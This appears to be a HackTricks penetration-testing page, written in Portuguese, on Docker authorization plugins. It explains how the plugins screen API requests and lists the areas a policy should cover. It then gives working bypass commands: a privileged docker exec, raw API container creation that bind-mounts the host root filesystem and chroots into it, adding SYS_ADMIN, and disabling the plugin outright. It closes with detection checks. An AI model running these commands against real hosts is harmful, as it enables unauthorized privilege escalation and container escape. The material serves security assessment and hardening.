# Plugins de Autorização em Tempo de Execução

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Plugins de autorização em tempo de execução são uma camada extra de política que decide se um chamador pode executar uma determinada ação do daemon. Docker é o exemplo clássico. Por padrão, qualquer pessoa que consiga se comunicar com o Docker daemon tem, efetivamente, amplo controle sobre ele. Plugins de autorização tentam restringir esse modelo examinando o usuário autenticado e a operação de API solicitada, permitindo ou negando a requisição conforme a política.

Este tópico merece sua própria página porque altera o modelo de exploração quando um atacante já tem acesso a uma Docker API ou a um usuário no grupo `docker`. Em tais ambientes a pergunta deixa de ser apenas "posso alcançar o daemon?" e passa a ser "o daemon está protegido por uma camada de autorização e, em caso afirmativo, essa camada pode ser contornada através de endpoints não tratados, análise fraca de JSON ou permissões de gerenciamento de plugins?"

## Operation

Quando uma requisição alcança o Docker daemon, o subsistema de autorização pode passar o contexto da requisição para um ou mais plugins instalados. O plugin vê a identidade do usuário autenticado, os detalhes da requisição, cabeçalhos selecionados e partes do corpo da requisição ou resposta quando o content type é adequado. Vários plugins podem ser encadeados, e o acesso é concedido somente se todos os plugins permitirem a requisição.

Esse modelo parece robusto, mas sua segurança depende inteiramente de quão completamente o autor da política entendeu a API. Um plugin que bloqueia `docker run --privileged` mas ignora `docker exec`, deixa passar chaves JSON alternativas como o top-level `Binds`, ou permite administração de plugins pode criar uma falsa sensação de restrição enquanto ainda deixa caminhos diretos de elevação de privilégio abertos.

## Common Plugin Targets

Áreas importantes para revisão da política são:

- endpoints de criação de container
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, e opções de compartilhamento de namespaces
- comportamento de `docker exec`
- endpoints de gerenciamento de plugins
- qualquer endpoint que possa indiretamente disparar ações em runtime fora do modelo de política pretendido

Historicamente, exemplos como o `authz` da Twistlock e plugins educacionais simples como `authobot` tornaram esse modelo fácil de estudar porque seus arquivos de política e caminhos de código mostravam como o mapeamento de endpoint-para-ação era realmente implementado. Para trabalhos de assessment, a lição importante é que o autor da política deve entender a superfície completa da API em vez de apenas os comandos CLI mais visíveis.

## Abuse

O primeiro objetivo é descobrir o que está realmente bloqueado. Se o daemon negar uma ação, o erro frequentemente leaks o nome do plugin, o que ajuda a identificar o controle em uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se você precisar de um profiling mais amplo de endpoints, ferramentas como `docker_auth_profiler` são úteis porque automatizam a tarefa repetitiva de verificar quais rotas da API e estruturas JSON são realmente permitidas pelo plugin.

Se o ambiente usar um plugin personalizado e você puder interagir com a API, enumere quais campos dos objetos são realmente filtrados:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Essas verificações importam porque muitas falhas de autorização são específicas de campo em vez de específicas de conceito. Um plugin pode rejeitar um padrão de CLI sem bloquear totalmente a estrutura de API equivalente.

### Exemplo completo: `docker exec` adiciona privilégio após a criação do container

Uma política que bloqueia a criação de containers privileged, mas permite a criação de containers unconfined e o uso de `docker exec`, ainda pode ser contornada:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se o daemon aceitar o segundo passo, o usuário terá recuperado um processo interativo privilegiado dentro de um container que o autor da política acreditava estar restrito.

### Exemplo Completo: Bind Mount Through Raw API

Algumas políticas com falhas inspecionam apenas uma forma de JSON. Se o bind mount do sistema de arquivos raiz não for bloqueado de forma consistente, o host ainda pode ser montado:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
A mesma ideia também pode aparecer em `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
O impacto é um full host filesystem escape. O detalhe interessante é que o bypass vem de cobertura incompleta da policy em vez de um bug no kernel.

### Exemplo completo: Unchecked Capability Attribute

Se a policy esquecer de filtrar um atributo relacionado a capability, o atacante pode criar um container que recupere uma capability perigosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Quando `CAP_SYS_ADMIN` ou uma capability igualmente poderosa estiver presente, muitas técnicas de breakout descritas em [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) tornam-se alcançáveis.

### Exemplo completo: Desativando o plugin

Se operações de gerenciamento de plugin forem permitidas, o bypass mais limpo pode ser desativar completamente o controle:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Isto é uma falha de política ao nível do plano de controle. A camada de autorização existe, mas o usuário que ela deveria restringir ainda mantém permissão para desativá-la.

## Verificações

Estes comandos visam identificar se uma camada de políticas existe e se parece ser completa ou superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
O que é interessante aqui:

- Mensagens de negação que incluem o nome de um plugin confirmam uma camada de autorização e frequentemente revelam a implementação exata.
- Uma lista de plugins visível para o atacante pode ser suficiente para descobrir se operações de desativar ou reconfigurar são possíveis.
- Uma política que bloqueia apenas ações óbvias de CLI, mas não requisições de API brutas, deve ser tratada como contornável até prova em contrário.

## Padrões do runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Daemon access is effectively all-or-nothing unless an authorization plugin is configured | política de plugin incompleta, listas negras em vez de listas de permissão, permitir gerenciamento de plugins, pontos cegos em nível de campo |
| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | expor amplamente uma API do Podman com root, permissões fracas no socket |
| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions, node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | montar o socket em cargas de trabalho, suposições fracas de confiança local do nó |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | RBAC excessivamente amplo, política de admissão fraca, expor diretamente kubelet ou APIs de runtime |
